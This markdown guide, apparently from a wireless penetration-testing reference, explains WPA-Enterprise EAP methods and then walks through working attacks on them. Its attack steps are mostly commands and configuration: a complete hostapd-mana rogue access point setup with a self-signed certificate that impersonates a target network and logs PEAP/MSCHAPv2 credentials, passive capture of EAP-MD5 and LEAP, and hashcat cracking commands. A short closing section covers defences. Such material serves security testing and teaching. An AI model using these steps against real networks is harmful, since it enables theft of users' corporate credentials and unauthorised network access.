# WPA-Enterprise (EAP) Attacks

## What is WPA-Enterprise?

WPA-Enterprise (also called WPA2-Enterprise or WPA3-Enterprise) replaces the shared passphrase of WPA-Personal with per-user authentication through a RADIUS server. The key difference: **the user's password never touches the WPA 4-way handshake**. Instead, credentials are exchanged inside an EAP (Extensible Authentication Protocol) method, usually wrapped in a TLS tunnel between the client and the RADIUS server. Capturing the WPA handshake from an enterprise network gives you nothing crackable.

To attack enterprise WiFi, you capture the **inner EAP credentials** — either passively (if the EAP method has no encryption) or by running a rogue AP that terminates the TLS tunnel and exposes the inner exchange.

## Key terms

| Acronym | Full name | What it is |
|---|---|---|
| **EAP** | Extensible Authentication Protocol | Framework for carrying authentication methods inside 802.1X. Defined in RFC 3748. |
| **PEAP** | Protected EAP | Wraps an inner EAP method (usually MSCHAPv2) inside a TLS tunnel. Most common enterprise WiFi method. |
| **EAP-TTLS** | EAP Tunneled TLS | Similar to PEAP — TLS outer tunnel, inner method can be MSCHAPv2, PAP, CHAP, or others. |
| **MSCHAPv2** | Microsoft Challenge-Handshake Authentication Protocol v2 | Password-based challenge/response used inside PEAP or EAP-TTLS. DES-based — fast to crack. |
| **EAP-TLS** | EAP Transport Layer Security | Certificate-based mutual authentication. No password transmitted. |
| **EAP-MD5** | EAP with MD5-Challenge | Simple challenge/response with no encryption. Sends hash in cleartext. |
| **LEAP** | Lightweight EAP | Cisco-proprietary method using MS-CHAPv1. No encryption. Deprecated. |
| **EAP-GTC** | EAP Generic Token Card | Carries a plaintext token or password inside a TLS tunnel (PEAP or TTLS). |
| **EAP-FAST** | EAP Flexible Authentication via Secure Tunneling | Cisco replacement for LEAP using PAC (Protected Access Credential) provisioning. |
| **EAP-PWD** | EAP Password | Dragonfly PAKE (same as WPA3-SAE). No crackable material exposed. |
| **RADIUS** | Remote Authentication Dial-In User Service | The backend server that validates credentials. The AP proxies EAP between client and RADIUS. |
| **802.1X** | IEEE 802.1X Port-Based Network Access Control | The standard that connects EAP to WiFi. Defines the Authenticator (AP), Supplicant (client), and Authentication Server (RADIUS) roles. |

## What you need

- A Linux system with a WiFi adapter (monitor mode helpful for passive capture but not required for rogue AP)
- **hostapd-mana** — rogue AP that terminates TLS and logs inner credentials (required for PEAP/MSCHAPv2)
- **hashcat** with GPU drivers — for offline cracking of captured hashes
- **[hcxpcapngtool](https://github.com/ZerBea/hcxtools)** or **wpawolf** — for extracting EAP-MD5 and LEAP hashes from passive captures
- A wordlist (e.g., `rockyou.txt` at `/usr/share/wordlists/rockyou.txt` on Kali)

## EAP Methods

Every enterprise WiFi network (AKMs 1, 3, 5, 11-13, 22, 23 and FILS 14-17) authenticates through an EAP method. The method determines what credentials exist on the wire and whether they can be captured or cracked.

### Crackable

| EAP Method | EAP Type | Tunnel | Capture method | hashcat mode | Notes |
|---|---|---|---|---|---|
| **PEAP/MSCHAPv2** | 25 + 26 | TLS | Rogue AP (hostapd-mana) | `-m 5500` | Most common enterprise method; 10B+/s on GPU (DES, no PBKDF2) |
| **EAP-TTLS/MSCHAPv2** | 21 + 26 | TLS | Rogue AP (hostapd-mana) | `-m 5500` | Same inner method as PEAP; same hashcat mode and speed |
| **EAP-MD5** | 4 | None | Passive capture | `-m 4800` | Challenge/response in cleartext; billions/s on GPU (raw MD5) |
| **Cisco LEAP** | 17 | None | Passive capture | `-m 5500` | MS-CHAPv1 in cleartext; deprecated by Cisco |

### Credential capture (no cracking needed)

| EAP Method | EAP Type | Tunnel | Capture method | hashcat mode | Notes |
|---|---|---|---|---|---|
| **EAP-TTLS/PAP** | 21 | TLS | Rogue AP (hostapd-mana) | N/A | Plaintext password directly — no hash, no cracking |
| **EAP-TTLS/CHAP** | 21 | TLS | Rogue AP (hostapd-mana) | N/A | CHAP hash, trivially reversible |
| **EAP-GTC** | 6 | TLS (inside PEAP/TTLS) | Rogue AP (hostapd-mana) | N/A | Plaintext token or password |

### Not crackable

| EAP Method | EAP Type | Tunnel | Capture method | hashcat mode | Notes |
|---|---|---|---|---|---|
| **EAP-TLS** | 13 | Mutual TLS | N/A | N/A | Certificate-based mutual authentication — no password transmitted |
| **EAP-FAST** | 43 | PAC + TLS | N/A | N/A | Requires valid PAC; rogue AP cannot provision one |
| **EAP-SIM / EAP-AKA** | 18 / 23 | N/A | N/A | N/A | SIM-card-based — no password exists |
| **EAP-PWD** | 52 | None | N/A | N/A | Dragonfly PAKE (like SAE) — no crackable material exposed |

## Step 1: PEAP/MSCHAPv2 -- rogue AP attack

This is the primary enterprise WiFi attack. PEAP wraps MSCHAPv2 inside a TLS tunnel. A rogue AP terminates the tunnel itself and captures the inner MSCHAPv2 challenge/response in cleartext.

### Set up hostapd-mana

Generate a self-signed certificate for the rogue AP:

```bash
openssl req -new -x509 -days 365 -nodes \
    -out /etc/hostapd-mana/certs/server.pem \
    -keyout /etc/hostapd-mana/certs/server.key \
    -subj "/CN=wifi.example.com/O=Example Corp/C=US"
```

Create the configuration file:

```ini
# /etc/hostapd-mana/hostapd-mana.conf
interface=wlan0
driver=nl80211
ssid=TargetNetworkName
channel=6
hw_mode=g

# WPA2-Enterprise
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1

# EAP server
eap_server=1
eap_user_file=/etc/hostapd-mana/mana.eap_user
ca_cert=/etc/hostapd-mana/certs/ca.pem
server_cert=/etc/hostapd-mana/certs/server.pem
private_key=/etc/hostapd-mana/certs/server.key

# Credential capture
mana_wpe=1
mana_credout=/tmp/mana_creds.txt
```

Create the EAP user file:

```ini
# /etc/hostapd-mana/mana.eap_user
* PEAP,EAP-TTLS,LEAP
"t" MSCHAPV2 "t" [2]
```

Launch the rogue AP:

```bash
hostapd-mana /etc/hostapd-mana/hostapd-mana.conf
```

When a client connects and its supplicant does not validate the server certificate, hostapd-mana terminates the TLS tunnel, observes the MSCHAPv2 exchange, and writes the challenge/response to `/tmp/mana_creds.txt`. The client receives an EAP-Failure (the rogue AP does not know the password), but the credentials are already captured.

### Extract the hash

hostapd-mana logs credentials in the format:

```
MSCHAPV2: jdoe | aabbccddeeff0011 | f14c0699e0c6adac8c8d93c20e0a62db7834b1c8eb3ebe5f
```

Convert to hashcat mode 5500 format:

```
username::::NT-Response:challenge
```

Example:

```
jdoe::::f14c0699e0c6adac8c8d93c20e0a62db7834b1c8eb3ebe5f:aabbccddeeff0011
```

### Crack with hashcat

```bash
hashcat -m 5500 captured.hc5500 wordlist.txt
```

Mode 5500 is extremely fast because the underlying construction is DES-based with no key stretching. There is no PBKDF2 — modern GPUs achieve 10+ billion candidates per second. Short passwords and dictionary words fall in seconds. This is orders of magnitude faster than WPA-Personal cracking (mode 22000), which requires 4096 rounds of HMAC-SHA1 per guess.

For brute-force against an 8-character alphanumeric password:

```bash
hashcat -m 5500 captured.hc5500 -a 3 '?a?a?a?a?a?a?a?a'
```

## Step 2: EAP-MD5 -- passive capture

EAP-MD5 transmits its challenge/response in cleartext with no TLS tunnel. A passive capture in monitor mode is sufficient — no rogue AP required.

The client computes `MD5(Identifier || Password || Challenge)` and sends the result in the open. Both the challenge and response are visible in the capture.

### Extract the hash

```bash
hcxpcapngtool --eapmd5=eapmd5.hc4800 capture.pcapng
```

### Crack with hashcat

```bash
hashcat -m 4800 eapmd5.hc4800 wordlist.txt
```

Mode 4800 is raw MD5 with no key stretching. Billions of candidates per second on GPU. Any password under ~10 characters with a reasonable charset is crackable in seconds.

## Step 3: Cisco LEAP -- passive capture

LEAP is a Cisco-proprietary EAP method that uses MS-CHAPv1 challenge/response in cleartext (no TLS tunnel). Like EAP-MD5, passive capture is sufficient.

The AP sends an 8-byte challenge, the client responds with a 24-byte DES-encrypted NT hash. Both are visible in the capture.

### Extract the hash

```bash
hcxpcapngtool --eapleap=leap.hc5500 capture.pcapng
```

The `asleap` tool can also extract and crack LEAP hashes:

```bash
asleap -r capture.pcap -f wordlist.dict -n asleap.hash
```

### Crack with hashcat

```bash
hashcat -m 5500 leap.hc5500 wordlist.txt
```

LEAP uses the same hashcat mode as PEAP/MSCHAPv2 (mode 5500). Same DES-based construction, same GPU speed, same cracking approach. LEAP passwords are typically domain credentials, so a targeted dictionary attack against common corporate passwords is effective.

## Defense

The primary defense against rogue AP attacks is **server certificate validation on the client**. If the client's supplicant is configured to validate the RADIUS server's certificate (CA pinning + domain name check), it rejects the rogue AP's self-signed certificate at the TLS handshake and exposes nothing.

Enterprise networks should enforce:

- Server certificate validation enabled in the supplicant configuration
- CA certificate pinned to the organization's CA (not "trust any certificate")
- Domain name validation on the server certificate
- Disable legacy methods (EAP-MD5, LEAP) entirely — these have no TLS protection and are crackable from passive captures regardless of client configuration

For EAP-MD5 and LEAP, there is no defense other than migrating away from them. Both methods transmit credentials without encryption.

## Deep dive

For protocol details, hash format specifications, and tool configuration:

- [PEAP / MSCHAPv2 reference](../eap-attacks/peap-mschapv2.md) — MSCHAPv2 challenge/response structure, DES weakness, hash format details
- [EAP-MD5 reference](../eap-attacks/eap-md5.md) — MD5-Challenge packet structure (RFC 3748 S5.4), extraction methods
- [Cisco LEAP reference](../eap-attacks/leap.md) — LEAP authentication flow, MS-CHAPv1 construction, deprecation status
- [hostapd-mana reference](../tools/hostapd-mana.md) — full configuration reference, certificate generation, eaphammer alternative
- [hashcat reference](../tools/hashcat.md) — all WiFi-related modes, attack patterns, advanced usage
